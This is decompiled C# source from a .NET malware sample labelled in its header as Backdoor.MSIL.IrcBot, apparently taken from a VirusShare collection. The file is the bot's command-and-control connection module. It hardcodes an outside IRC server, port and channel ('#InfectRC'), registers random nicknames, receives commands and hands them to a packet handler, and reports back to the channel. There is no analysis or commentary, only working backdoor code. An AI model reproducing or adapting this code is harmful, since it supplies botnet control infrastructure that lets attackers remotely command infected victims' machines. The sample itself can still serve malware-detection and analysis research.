// Decompiled with JetBrains decompiler
// Type: AppClient.Connexion
// Assembly: AppClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 40D3B218-45AF-4713-B3C6-786D65AE1018
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Backdoor.MSIL.IrcBot.qe-710c3e02ba2956aa9af7f425e418218917e2c44f55f619222b605ff80f0dd9b9.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.CompilerServices;

namespace AppClient
{
  [StandardModule]
  public sealed class Connexion
  {
    public static string IRCServer = "irc.epiknet.net";
    public static int IRCPort = 6667;
    public static string Canal = "#InfectRC";
    [AccessedThroughProperty("eConnexion")]
    private static BazSocket _eConnexion;
    private static string Parsed;
    public static Random Rand;

    static Connexion()
    {
      Connexion.eConnexion = new BazSocket();
      Connexion.Parsed = "";
      Connexion.Rand = new Random();
    }

    public static BazSocket eConnexion
    {
      get => Connexion._eConnexion;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataArrivalEventHandler arrivalEventHandler = new DataArrivalEventHandler(Connexion.PacketReceive);
        EventHandler eventHandler = new EventHandler(Connexion.Connected);
        if (Connexion._eConnexion != null)
        {
          Connexion._eConnexion.DataArrival -= arrivalEventHandler;
          Connexion._eConnexion.Connected -= eventHandler;
        }
        Connexion._eConnexion = value;
        if (Connexion._eConnexion == null)
          return;
        Connexion._eConnexion.DataArrival += arrivalEventHandler;
        Connexion._eConnexion.Connected += eventHandler;
      }
    }

    public static string RandomString()
    {
      string str = "abcdefghijklmnopqrstuvwxyz";
      Random random = new Random();
      string empty = string.Empty;
      int num = 1;
      do
      {
        empty += Conversions.ToString(str[random.Next(0, str.Length)]);
        checked { ++num; }
      }
      while (num <= 6);
      return empty;
    }

    private static void Connected(object sender, EventArgs e)
    {
      string str = Connexion.RandomString() + Conversions.ToString(Connexion.Rand.Next(10, 1000));
      Connexion.SendPacket("NICK " + str);
      Connexion.SendPacket("USER " + str + " localhost " + Connexion.IRCServer + ": " + str);
    }

    private static void PacketReceive(object sender, byte[] data)
    {
      byte[] numArray = data;
      int index = 0;
      while (index < numArray.Length)
      {
        byte CharCode = numArray[index];
        switch (CharCode)
        {
          case 10:
            PacketHandler.HandlePacket(Connexion.Parsed);
            Connexion.Parsed = "";
            goto case 13;
          case 13:
            checked { ++index; }
            continue;
          default:
            Connexion.Parsed += Conversions.ToString(Strings.ChrW((int) CharCode));
            goto case 13;
        }
      }
    }

    public static void SendToChannel(string Text) => Connexion.SendPacket("PRIVMSG " + Connexion.Canal + " :" + Text);

    public static void SendPacket(string Packet) => Connexion.eConnexion.Send(Packet + "\n");
  }
}
